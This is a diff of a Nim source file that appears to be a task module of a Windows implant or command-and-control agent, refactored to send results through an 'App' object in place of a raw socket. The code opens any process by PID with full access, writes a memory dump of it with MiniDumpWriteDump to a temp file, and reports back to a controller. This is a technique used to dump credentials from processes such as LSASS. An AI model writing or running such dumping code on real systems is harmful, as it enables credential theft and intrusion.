@@ -1,5 +1,5 @@
-import ../client/communication
-from std/net import Socket 
+import ../client/[communication, types]
+
 import json, strutils, os
 import winim/[lean]
 
@@ -17,7 +17,7 @@ proc MiniDumpWriteDump(
   CallbackParam: INT
 ): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}
 
-proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
+proc executeTask*(app: App, taskId: int, params: seq[string]) =
   let taskOutput = TaskOutput(
     task: "output",
     taskId: taskId,
@@ -28,7 +28,7 @@ proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
   let hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](parseInt(params[0])))
   if not bool(hProcess):
     taskOutput.error = "could not open process with PID " & params[0]
-    socket.sendOutput(taskOutput)
+    app.sendOutput(taskOutput)
     return
 
   var fs = open(tempdir & "/" & params[0] & ".dump", fmWrite)
@@ -45,4 +45,4 @@ proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
   else:
     taskOutput.error = "failed to write dump for process with PID " & params[0]
   
-  socket.sendOutput(taskOutput)
+  app.sendOutput(taskOutput)
